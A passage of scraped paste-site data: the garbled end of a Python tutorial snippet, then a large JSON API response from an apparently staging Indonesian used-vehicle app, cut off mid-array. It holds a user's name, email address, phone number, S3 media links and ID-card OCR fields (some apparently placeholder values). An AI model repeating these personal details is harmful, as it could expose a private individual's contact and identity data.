print(example_heater.is_turned_on) # ÏõêÎûòÎäî False

# smart_homeÏùò Heater ÌÅ¥ÎûòÏä§ÏóêÎäî ÏïÑÎûò Ìï®ÏàòÍ∞Ä ÏûàÏäµÎãàÎã§.
# def turn_on(self):
#     self.is_turned_on = True
example_heater.turn_on() 
print(example_heater.is_turned_on) # TrueÎ°ú Î∞îÎÄú
"
eBi8T15H,[MUF] User Vehicle Submission Response,ffajarpratama,JSON,Sunday 7th of April 2024 09:48:53 PM CDT,"{
    ""success"": true,
    ""data"": {
        ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
        ""city_id"": ""c2ca90f6-133b-4818-8957-e01a9e478f63"",
        ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
        ""vehicle_variant_id"": ""9cf3e998-7c5d-4472-b1b1-cc902ef8b93f"",
        ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
        ""vehicle_color_id"": ""af457484-4a2d-41a2-9b50-33a797203345"",
        ""vehicle_series_id"": ""8cf758e4-7ff7-4d4a-8ae7-195de1dfe34e"",
        ""year"": 2022,
        ""license_plate"": ""B"",
        ""is_plate_number_even"": true,
        ""odometer"": 35000,
        ""ownership_status"": ""individual"",
        ""ac_condition"": ""normal"",
        ""tyre_condition"": ""90% - 99%"",
        ""body_condition"": ""normal"",
        ""flood_damage"": false,
        ""registration_validity_period"": ""04-2025"",
        ""description"": ""[new-flow] Honda Civic Type R 6-Speed MT, individual owned, listed by owner"",
        ""price"": 250000000,
        ""type"": ""individual"",
        ""created_by"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
        ""dealer_id"": null,
        ""approved_by"": null,
        ""approved_at"": 0,
        ""updated_by"": null,
        ""status"": ""waiting-verification"",
        ""reason"": """",
        ""total_submission_field"": 43,
        ""total_submission_field_reviewed"": 0,
        ""is_recommended"": false,
        ""is_popular"": false,
        ""is_trending"": false,
        ""assignee_id"": null,
        ""created_at"": 1712402377,
        ""updated_at"": 1712402392,
        ""deleted_at"": 0,
        ""city"": {
            ""city_id"": ""c2ca90f6-133b-4818-8957-e01a9e478f63"",
            ""name"": ""Tangerang Selatan"",
            ""position"": 10,
            ""province_id"": ""7b8984ec-b722-4089-afdb-f77f796e1b5a"",
            ""created_at"": 1702442413,
            ""updated_at"": 1702442413,
            ""deleted_at"": 0,
            ""province"": {
                ""province_id"": ""7b8984ec-b722-4089-afdb-f77f796e1b5a"",
                ""name"": ""Banten"",
                ""created_at"": 1702435790,
                ""updated_at"": 1702435790,
                ""deleted_at"": 0
            }
        },
        ""vehicle_brand"": {
            ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
            ""name"": ""HONDA"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": ""00T"",
            ""media_id"": ""3ffbf111-3a88-4012-a025-e90fac1e7f94"",
            ""created_at"": 1691577703,
            ""updated_at"": 1691577703,
            ""deleted_at"": 0,
            ""vehicle_group"": null,
            ""media"": null
        },
        ""vehicle_variant"": {
            ""vehicle_variant_id"": ""9cf3e998-7c5d-4472-b1b1-cc902ef8b93f"",
            ""name"": ""6-Speed MT"",
            ""vehicle_series_id"": ""8cf758e4-7ff7-4d4a-8ae7-195de1dfe34e"",
            ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
            ""vehicle_category_id"": ""e35060f5-538e-4a5e-a8dc-44a4a875d942"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""vehicle_fuel_id"": ""7f5ceae2-24ff-4add-a3ca-97352cb1443f"",
            ""vehicle_transmission_id"": ""5a395636-3a47-432f-997f-cc215f80fe1e"",
            ""vehicle_type_id"": ""b32b65cb-3a97-4bfb-bf24-07f7cd07457d"",
            ""code"": """",
            ""moas_id"": null,
            ""is_recommended"": true,
            ""is_popular"": false,
            ""is_trending"": false,
            ""created_at"": 1701253610,
            ""updated_at"": 1706086899,
            ""deleted_at"": 0,
            ""all_specs"": null,
            ""vehicle_series"": null,
            ""vehicle_brand"": null,
            ""vehicle_category"": null,
            ""vehicle_group"": null,
            ""vehicle_fuel"": null,
            ""vehicle_transmission"": null,
            ""vehicle_specs"": null,
            ""vehicle_otr"": null,
            ""vehicle_type"": null
        },
        ""vehicle_type"": {
            ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
            ""name"": ""Mobil Bekas"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": ""004"",
            ""created_at"": 0,
            ""updated_at"": 0,
            ""deleted_at"": 0,
            ""vehicle_group"": {
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""name"": ""Mobil"",
                ""code"": ""002"",
                ""kind"": 2,
                ""created_at"": 1694492214,
                ""updated_at"": 1694492214,
                ""deleted_at"": 0
            }
        },
        ""vehicle_color"": {
            ""vehicle_color_id"": ""af457484-4a2d-41a2-9b50-33a797203345"",
            ""name"": ""Hitam"",
            ""hex"": ""#101828"",
            ""created_at"": 1702731982,
            ""updated_at"": 1702731982,
            ""deleted_at"": 0
        },
        ""vehicle_series"": {
            ""vehicle_series_id"": ""8cf758e4-7ff7-4d4a-8ae7-195de1dfe34e"",
            ""name"": ""CIVIC TYPE R"",
            ""vehicle_brand_id"": ""31edaaaa-631c-4254-82a5-f3423fee3050"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": """",
            ""moas_id"": 63,
            ""vehicle_category_id"": ""e35060f5-538e-4a5e-a8dc-44a4a875d942"",
            ""created_at"": 1701242399,
            ""updated_at"": 1701242399,
            ""deleted_at"": 0,
            ""min_price"": 0,
            ""max_price"": 0,
            ""domicile_name"": """",
            ""wishlisted"": false,
            ""vehicle_brand"": null,
            ""vehicle_group"": null,
            ""vehicle_otrs"": null,
            ""vehicle_series_image"": null,
            ""vehicle_series_thumbnail"": null,
            ""vehicle_category"": null
        },
        ""created_by_user"": {
            ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""name"": ""Gorengan"",
            ""email"": ""mufkalif18@gmail.com"",
            ""phone_number"": ""62888999666"",
            ""last_login_at"": 0,
            ""last_seen_at"": 0,
            ""verified_at"": 1695352377,
            ""register_source"": ""google"",
            ""created_at"": 1695350727,
            ""updated_at"": 1708588317,
            ""deleted_at"": 0,
            ""user_info"": {
                ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                ""alt_email"": """",
                ""phone_number"": ""62888999666"",
                ""alt_phone_number"": """",
                ""place_of_birth"": """",
                ""date_of_birth"": """",
                ""media_id"": ""37d148dd-295e-4cab-9b87-c54f6ea646c8"",
                ""ktp_verified_at"": 1712290801,
                ""total_point"": 400,
                ""total_coupon"": -1,
                ""created_at"": 1694626580,
                ""updated_at"": 1712290801,
                ""deleted_at"": 0,
                ""scan_ktp"": null,
                ""spouse_scan_ktp"": null,
                ""media"": {
                    ""media_id"": ""37d148dd-295e-4cab-9b87-c54f6ea646c8"",
                    ""path"": ""dealer/document/1706238573.jpg"",
                    ""size"": 27854,
                    ""mimetype"": ""image/jpeg"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""name"": ""1706238573.jpg"",
                    ""purpose"": ""dealer-document"",
                    ""created_at"": 1706238573,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/dealer/document/1706238573.jpg"",
                    ""user"": null
                }
            },
            ""user_roles"": [
                {
                    ""role_id"": ""80eb53b5-a584-418c-9907-ee3e418a99b0"",
                    ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                    ""approve_at"": 0,
                    ""created_at"": 1701240189,
                    ""updated_at"": 1701240189,
                    ""deleted_at"": 0,
                    ""role"": {
                        ""role_id"": ""80eb53b5-a584-418c-9907-ee3e418a99b0"",
                        ""name"": ""Customer""
                    }
                }
            ],
            ""user_dealer"": null,
            ""has_pin"": false,
            ""dealer"": null
        },
        ""dealer"": null,
        ""approved_by_user"": null,
        ""updated_by_user"": null,
        ""assignee"": null,
        ""vehicle_images"": [
            {
                ""vehicle_image_id"": ""422d4321-bda2-421e-bf4a-7ddf968262bf"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""4f0daecb-d4ce-4593-bff3-cd79f8d8cd1b"",
                    ""name"": ""Tampak Depan"",
                    ""position"": 1,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""9ce69e6f-2865-485e-b8b4-dac8b6173529"",
                    ""wrong_car_image_id"": ""80eed9d9-7f3f-496e-af92-05d7e8dfa538"",
                    ""correct_mcy_image_id"": ""7bf7b7d7-e1d7-4520-a318-685d6625dbdd"",
                    ""wrong_mcy_image_id"": ""93a7f050-1634-43b7-bfa5-25f5f6777f7e"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""115fc88a-35e1-4093-a8d1-29294e1bd29e"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""94d995ae-989d-4384-bfe6-4c5c4e927bdc"",
                    ""name"": ""Tampak Samping Kanan"",
                    ""position"": 2,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""3419d840-21f0-4cfe-878e-61cd3deed67f"",
                    ""wrong_car_image_id"": ""7fac074a-8c52-4b48-8fc0-ecbd9e604b1d"",
                    ""correct_mcy_image_id"": ""41ed93fe-9614-412a-aaa2-d75f3507ebae"",
                    ""wrong_mcy_image_id"": ""aea6b171-298c-466f-9d6f-8e8b9e05dbc6"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""03f166c1-bbf5-489c-9449-6f9a99c6a965"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""8335ed3b-9380-48e1-85c1-42ffa1e2dea6"",
                    ""name"": ""Tampak Samping Kiri"",
                    ""position"": 3,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""aa2ef5f0-0dcf-4584-aba6-0812e588e334"",
                    ""wrong_car_image_id"": ""0d1610d7-0491-4cb3-87c1-7bfe69c3c421"",
                    ""correct_mcy_image_id"": ""38a371cb-95c0-453e-9fb6-fb5f1289170c"",
                    ""wrong_mcy_image_id"": ""b2bffb2e-4235-41fd-b4c9-d041e931c0a0"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""b4afa05b-a874-43fc-bda8-d2c3677cc884"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""b8aeade6-4de9-4b46-be02-0a4d1994602c"",
                    ""name"": ""Tampak Belakang"",
                    ""position"": 4,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""3e0810af-11f1-415c-9b35-92a74acb7afe"",
                    ""wrong_car_image_id"": ""7400d055-ff0f-488e-a549-17158a167abe"",
                    ""correct_mcy_image_id"": ""5bef6f5d-0d36-4a0f-af17-e4e5d7775af7"",
                    ""wrong_mcy_image_id"": ""e78903fd-7cde-45c7-be3e-ad369f6e33db"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""02d47b7f-d55b-4dcc-9996-310de4d6bcb2"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""00746412-72cc-46fd-b6b7-64f16e0276f7"",
                    ""name"": ""Spidometer Kendaraan"",
                    ""position"": 5,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""00197df4-5101-43c4-839a-0224f6460461"",
                    ""wrong_car_image_id"": ""7885432a-19bf-4d9d-95c9-8d1f6827d53b"",
                    ""correct_mcy_image_id"": ""aee37887-2b12-4339-8ad2-05c9c0fcd9fa"",
                    ""wrong_mcy_image_id"": ""8779ab94-c9e2-4a13-8db6-5ec6b4513958"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""5e6d1324-e472-4669-8f0e-d5014c682ac1"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""93bd78eb-cd01-42d7-8a6e-581d6c69a8f9"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""93bd78eb-cd01-42d7-8a6e-581d6c69a8f9"",
                    ""name"": ""Dashboard Kendaraan"",
                    ""position"": 6,
                    ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
                    ""correct_car_image_id"": ""a55b51e9-079a-4408-8720-cee6d54548b5"",
                    ""wrong_car_image_id"": ""84ffb232-78bc-41bb-a5e0-ed2ba2a57428"",
                    ""correct_mcy_image_id"": null,
                    ""wrong_mcy_image_id"": null,
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""67eb048c-65cb-43c2-861d-97547afc468c"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""3a17ff9a-2c0a-408c-ac2a-b2347a1e3194"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""3a17ff9a-2c0a-408c-ac2a-b2347a1e3194"",
                    ""name"": ""Mesin "",
                    ""position"": 7,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": ""0ac8b50f-d863-4032-a5e2-185dcf819972"",
                    ""wrong_car_image_id"": ""4919f8b1-5878-4aca-a57a-2ee7ff6d5cd3"",
                    ""correct_mcy_image_id"": ""49c996a7-b655-4132-86e7-a9b1d9a9f3cf"",
                    ""wrong_mcy_image_id"": ""3444bb81-9c07-4119-a64d-3270a30db44a"",
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""3cfe638d-8e6d-4cde-838e-c864c40019b5"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""0690ed99-bdac-4d76-8174-5921a3cbfee3"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""0690ed99-bdac-4d76-8174-5921a3cbfee3"",
                    ""name"": ""Kursi Depan"",
                    ""position"": 8,
                    ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
                    ""correct_car_image_id"": ""4f71ad77-4049-4659-bf11-b50a7f3d9ac3"",
                    ""wrong_car_image_id"": ""dd47e1a2-d016-4c00-91ba-5bed8c2080af"",
                    ""correct_mcy_image_id"": null,
                    ""wrong_mcy_image_id"": null,
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""8f7ea638-aee0-41df-a0ec-507023259ee6"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""9a88f049-9e13-4214-b5a6-e3b99be221a8"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""9a88f049-9e13-4214-b5a6-e3b99be221a8"",
                    ""name"": ""Kursi Belakang"",
                    ""position"": 9,
                    ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
                    ""correct_car_image_id"": ""dfde16d6-3a80-4f9b-ba29-84ee8004dd14"",
                    ""wrong_car_image_id"": ""6aafdf1b-c426-4cef-8781-c34f426746ee"",
                    ""correct_mcy_image_id"": null,
                    ""wrong_mcy_image_id"": null,
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            },
            {
                ""vehicle_image_id"": ""d8004e98-ab4d-46c1-845d-ee0594683d37"",
                ""image_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""vit_id"": ""fef8fb52-39e0-4454-849c-567dac324571"",
                ""created_at"": 1712402378,
                ""updated_at"": 1712402378,
                ""deleted_at"": 0,
                ""vehicle_image_type"": {
                    ""vit_id"": ""fef8fb52-39e0-4454-849c-567dac324571"",
                    ""name"": ""Lainnya"",
                    ""position"": 10,
                    ""vehicle_type_id"": null,
                    ""correct_car_image_id"": null,
                    ""wrong_car_image_id"": null,
                    ""correct_mcy_image_id"": null,
                    ""wrong_mcy_image_id"": null,
                    ""created_at"": 1702732871,
                    ""updated_at"": 1702732871,
                    ""deleted_at"": 0,
                    ""vehicle_type"": null,
                    ""correct_car_image"": null,
                    ""wrong_car_image"": null,
                    ""correct_mcy_image"": null,
                    ""wrong_mcy_image"": null
                },
                ""image"": {
                    ""media_id"": ""f97cbe4c-ec37-4a25-81be-d31960db24e5"",
                    ""path"": ""community/post/image/1703041365.png"",
                    ""size"": 455444,
                    ""mimetype"": ""image/png"",
                    ""user_id"": ""6110444c-9ce4-4395-b76f-fbb8ff861b13"",
                    ""name"": ""1703041365.png"",
                    ""purpose"": ""image"",
                    ""created_at"": 1703041365,
                    ""deleted_at"": 0,
                    ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/community/post/image/1703041365.png"",
                    ""user"": null
                }
            }
        ],
        ""history_status"": [
            {
                ""history_status_id"": ""1f36914b-591f-442b-bc4f-d7ad07cfcd53"",
                ""dealer_id"": null,
                ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                ""atd_id"": null,
                ""order_id"": null,
                ""stnk_renewal_id"": null,
                ""status"": ""waiting-verification"",
                ""purpose"": ""user-vehicle-log"",
                ""metadata"": null,
                ""created_at"": 1712402379,
                ""updated_at"": 1712402379,
                ""dealer"": null,
                ""user_vehicle"": null,
                ""appointment_test_drive"": null,
                ""order"": null,
                ""stnk_renewal"": null
            }
        ],
        ""scan_ktp"": {
            ""scan_ktp_id"": ""972bdd49-f288-476f-951d-2e665e7ebb6b"",
            ""nik"": ""3173123456789012"",
            ""name"": ""Rahmad"",
            ""birth_place"": ""JAKARTA"",
            ""birth_date"": ""1980-01-12T00:00:00Z"",
            ""address"": ""JL. SUKSES BAHAGIA"",
            ""province"": ""PROVINSI DKI JAKARTA"",
            ""city"": ""JAKARTA BARAT"",
            ""district"": ""KEMBANGAN"",
            ""village"": ""MAJU MAKMUR"",
            ""rt_rw"": ""007/001"",
            ""ref_id"": """",
            ""occupation"": ""WIRASWASTA"",
            ""address_domicile"": ""JL. SUKSES BAHAGIA"",
            ""province_domicile"": ""PROVINSI DKI JAKARTA"",
            ""city_domicile"": ""JAKARTA BARAT"",
            ""district_domicile"": ""KEMBANGAN"",
            ""village_domicile"": ""MAJU MAKMUR"",
            ""rt_rw_domicile"": ""007/001"",
            ""marital_status"": ""KAWIN"",
            ""gender"": ""LAKI-LAKI"",
            ""nationality"": """",
            ""ktp_media_id"": ""286030f4-fd6e-4849-9d3f-05dc652e509d"",
            ""purpose"": ""personal"",
            ""verihubs_subject_id"": """",
            ""phone_number"": """",
            ""created_by"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
            ""created_at"": 1712290801,
            ""updated_at"": 1712290801,
            ""deleted_at"": 0,
            ""created_by_user"": null,
            ""ktp_media"": {
                ""media_id"": ""286030f4-fd6e-4849-9d3f-05dc652e509d"",
                ""path"": ""ocr/ktp/1712290592.jpg"",
                ""size"": 136446,
                ""mimetype"": ""image/jpeg"",
                ""user_id"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
                ""name"": ""1712290592.jpg"",
                ""purpose"": ""ocr-ktp"",
                ""created_at"": 1712290592,
                ""deleted_at"": 0,
                ""media_url"": ""https://muf-superapps-stg.s3.ap-southeast-3.amazonaws.com/ocr/ktp/1712290592.jpg"",
                ""user"": null
            }
        },
        ""user_dealer"": null,
        ""wishlisted"": false,
        ""firestore_room_id"": """",
        ""submission_data"": {
            ""ktp"": [
                {
                    ""uv_submission_id"": ""23543f07-139e-4b1e-b70c-9e473f634803"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""address"",
                    ""value"": ""JL. SUKSES BAHAGIA"",
                    ""corrected_value"": null,
                    ""comment"": """",
                    ""approved_at"": 0,
                    ""rejected_at"": 0,
                    ""created_at"": 1712402390,
                    ""updated_at"": 1712402390,
                    ""user_vehicle"": null
                },
                {
                    ""uv_submission_id"": ""9d172810-c2c2-4757-9c93-f06847118252"",
                    ""user_vehicle_id"": ""0a011fa9-ea7d-4d83-9d54-e4f6e4fda749"",
                    ""type"": ""ktp"",
                    ""field"": ""province"",
                    ""value"": ""PROVINSI DKI JAKARTA"",
                    ""corrected_value"": null,
                    ""comment"": """",
